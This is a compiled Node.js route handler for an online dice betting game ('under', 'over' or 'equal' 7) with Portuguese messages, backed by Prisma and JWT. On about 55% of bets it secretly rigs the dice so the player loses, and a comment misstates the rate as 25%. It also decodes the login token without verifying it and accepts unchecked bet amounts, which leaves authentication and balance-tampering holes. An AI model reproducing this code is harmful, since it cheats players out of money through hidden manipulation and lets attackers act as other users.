"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.default = Uoseven;
const client_1 = require("@prisma/client");
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const prisma = new client_1.PrismaClient();
function Uoseven(req, res) {
    return __awaiter(this, void 0, void 0, function* () {
        const { a, b, c } = req.body;
        if (!a || !b || !c) {
            return res
                .status(400)
                .send({ message: "Alguma variável não foi definida" });
        }
        try {
            const decoded = jsonwebtoken_1.default.decode(a);
            if (!decoded || !decoded.email) {
                return res
                    .status(400)
                    .send({ message: "Email não encontrado no token." });
            }
            const email = String(decoded.email);
            const user = yield prisma.user.findUnique({
                where: { email },
                include: { recharges: { orderBy: { createdAt: "desc" } } },
            });
            if (!user) {
                return res.status(404).send({ message: "Usuário não encontrado." });
            }
            if (user.balance < b) {
                return res
                    .status(400)
                    .send({ message: "Saldo menor que valor de aposta!" });
            }
            try {
                let d1, d2, diceSum;
                let newBalance = user.balance - b;
                let message = "Perda!";
                const chanceManipulacao = Math.random() < 0.55; // 25% de chance de contrariar a aposta
                if (chanceManipulacao) {
                    // Manipula os dados para garantir que o jogador perca
                    if (c === "under") {
                        d1 = Math.floor(Math.random() * 3) + 4; // Gera valores entre 4 e 6
                        d2 = Math.floor(Math.random() * 6) + 1; // Normal
                    }
                    else if (c === "over") {
                        d1 = Math.floor(Math.random() * 3) + 1; // Gera valores entre 1 e 3
                        d2 = Math.floor(Math.random() * 6) + 1; // Normal
                    }
                    else if (c === "equal") {
                        do {
                            d1 = Math.floor(Math.random() * 6) + 1;
                            d2 = Math.floor(Math.random() * 6) + 1;
                        } while (d1 + d2 === 7); // Garante que não seja igual a 7
                    }
                }
                else {
                    // Gera os dados normalmente
                    d1 = Math.floor(Math.random() * 6) + 1;
                    d2 = Math.floor(Math.random() * 6) + 1;
                }
                if (d1 === undefined || d2 === undefined) {
                    return res.status(500).send({
                        message: "Erro ao realizar soma dos valores dos dados, undefined!",
                    });
                }
                diceSum = d1 + d2;
                // Verifica se o usuário ganhou ou perdeu
                if (c === "under" && diceSum < 7) {
                    newBalance = user.balance + b * 1.92;
                    message = "Ganho!";
                }
                else if (c === "over" && diceSum > 7) {
                    newBalance = user.balance + b * 1.92;
                    message = "Ganho!";
                }
                else if (c === "equal" && diceSum === 7) {
                    newBalance = user.balance + b * 8.7;
                    message = "Ganho!";
                }
                // Atualiza saldo do usuário
                yield prisma.user.update({
                    data: { balance: newBalance },
                    where: { email },
                });
                return res.status(200).send({ message, d1, d2, balance: newBalance });
            }
            catch (error) {
                return res
                    .status(500)
                    .send({ message: "Erro ao atualizar saldo do usuário" });
            }
        }
        catch (error) {
            return res.status(500).send({ message: "Erro interno do servidor" });
        }
    });
}
